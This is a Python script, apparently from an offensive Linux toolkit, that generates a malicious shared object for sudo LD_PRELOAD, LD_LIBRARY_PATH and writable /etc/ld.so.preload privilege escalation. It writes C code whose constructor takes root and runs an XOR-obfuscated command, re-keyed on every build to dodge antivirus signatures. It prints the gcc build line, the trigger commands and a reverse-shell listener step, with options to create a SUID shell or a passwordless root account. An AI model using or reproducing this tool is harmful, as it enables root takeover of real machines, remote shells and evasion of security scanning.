#!/usr/bin/env python3
"""SUDO env_keep LD_PRELOAD privesc — the Linux "planted DLL" analog.

When `sudo -l` shows `env_keep+=LD_PRELOAD` (or LD_LIBRARY_PATH), any command you're
allowed to run under sudo will first load a shared object you point LD_PRELOAD at — and
the loader runs its constructor AS ROOT before the real program starts. Build a .so whose
__attribute__((constructor)) sets uid 0 and execs your action.

PRINTS the .c source path + the gcc build line + the exact `sudo LD_PRELOAD=...` trigger.
Edit LHOST/LPORT in _linpriv_common.py.

Usage:
  python3 gen_preload.py [--action revshell|suid_bash|add_root|nopasswd] [--mode ldpreload|ldlib|globalpreload]
                         [--sudocmd <allowed sudo command>] [--lib crypt] [--name pre.so]
                         [--stagedir /dev/shm] [--revtype bash|mkfifo|python|perl|nc]
  --stagedir : where the .so lands (default STAGE=/tmp; use another dir if /tmp is noexec).
  --revtype  : reverse-shell flavor for --action revshell (dash/busybox targets).

  ldpreload    (default) sudo env_keep+=LD_PRELOAD  -> point LD_PRELOAD at the .so
  ldlib        sudo env_keep+=LD_LIBRARY_PATH       -> .so named lib<lib>.so in a dir you control (--lib = a dep of the cmd)
  globalpreload writable /etc/ld.so.preload         -> add the .so path; it loads into EVERY dynamically-linked binary
                                                        (incl. any SUID) as root — run any SUID (e.g. /bin/su) to fire it

Find the vector first:  sudo -l   (env_keep+=LD_PRELOAD / LD_LIBRARY_PATH)   |   ls -l /etc/ld.so.preload  (writable?)
"""
import sys
import _linpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

action  = opt("--action", "revshell")
mode    = opt("--mode", "ldpreload")
sudocmd = opt("--sudocmd", "<any-command-sudo-l-allows>")
lib     = opt("--lib", "crypt")
soname  = opt("--name", "pre.so")
stage   = opt("--stagedir", P.STAGE).rstrip("/")   # noexec /tmp? pass --stagedir /dev/shm etc.
revtype = opt("--revtype", None)                   # bash|mkfifo|python|perl|nc (dash/busybox targets)
if mode == "ldlib":
    soname = f"lib{lib}.so"          # LD_LIBRARY_PATH resolves lib<name>.so by SONAME
if action not in P.root_actions():
    print(f"unknown action '{action}'. pick: {', '.join(P.root_actions())}"); sys.exit(1)

post = P.root_actions(revtype)[action]
# XOR-obfuscate the command so the plaintext isn't sitting in the .so (AV/static-scan hygiene; not EDR-proof).
import random
key = random.randint(1, 255)     # RANDOM per build -> byte-unique .so, no fixed-key signature
enc = bytes(b ^ key for b in post.encode()) + bytes([0x00 ^ key])
arr = ",".join(str(b) for b in enc)

src = soname.rsplit(".", 1)[0] + ".c"
c = (
    "#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n"
    f"static unsigned char e[]={{{arr}}};static char k={key};\n"
    "__attribute__((constructor)) void init(){\n"
    "  int n=sizeof(e),i; char b[sizeof(e)];\n"
    "  for(i=0;i<n;i++) b[i]=e[i]^k;\n"
    "  setgid(0); setuid(0);\n"                # loader runs us as root under sudo; drop-to-root
    "  system(b);\n"
    "}\n"
)
open(src, "w").write(c)

print(f"# LD-loader sudo privesc   mode={mode}   action={action}   so={soname}")
print(f"# wrote {src}  (embedded command XOR-obfuscated, decoded at load)\n")
print(f"# 1) build the .so — ON THE TARGET if gcc is present:")
print(f"gcc -shared -fPIC -o {stage}/{soname} {src}")
print(f"#    ...or build on the attacker and ship {stage}/{soname} over (wget/scp/base64).\n")
print(f"# 2) trigger:")
if mode == "ldpreload":
    print(f"sudo LD_PRELOAD={stage}/{soname} {sudocmd}")
    print(f"#    ^ the loader runs the .so constructor as root BEFORE '{sudocmd}' does anything.")
    print(f"# requires: env_keep+=LD_PRELOAD in the sudoers rule.")
elif mode == "ldlib":
    print(f"#    (verify the allowed cmd actually loads lib{lib}:  ldd $(which {sudocmd.split()[0]}) | grep {lib})")
    print(f"sudo LD_LIBRARY_PATH={stage} {sudocmd}")
    print(f"#    ^ {stage}/{soname} shadows the real lib{lib}.so; its constructor runs as root.")
    print(f"# requires: env_keep+=LD_LIBRARY_PATH. Name the .so after a REAL dependency (--lib), else the cmd may still run.")
elif mode == "globalpreload":
    print(f"echo {stage}/{soname} >> /etc/ld.so.preload      # requires /etc/ld.so.preload WRITABLE by you")
    print(f"su root -c true 2>/dev/null; /bin/ping -c1 127.0.0.1   # run ANY setuid/normal binary → loads the .so as its uid")
    print(f"#    ^ ld.so.preload loads into EVERY dynamically-linked program; the first SUID one you run fires it as root.")
    print(f"# cleanup:  remove your line from /etc/ld.so.preload (it breaks all binaries if the .so is deleted first!).")
else:
    print(f"# unknown mode '{mode}' (use ldpreload|ldlib|globalpreload)"); sys.exit(1)
print()
if action == "revshell":
    print(f"# start the catcher first:  nc -lvnp {P.LPORT}   on {P.LHOST}")
elif action == "suid_bash":
    print(f"# after it runs:  {stage}/.rb -p   → root shell")
elif action == "add_root":
    print(f"# after it runs:  su r   (no password) → root")
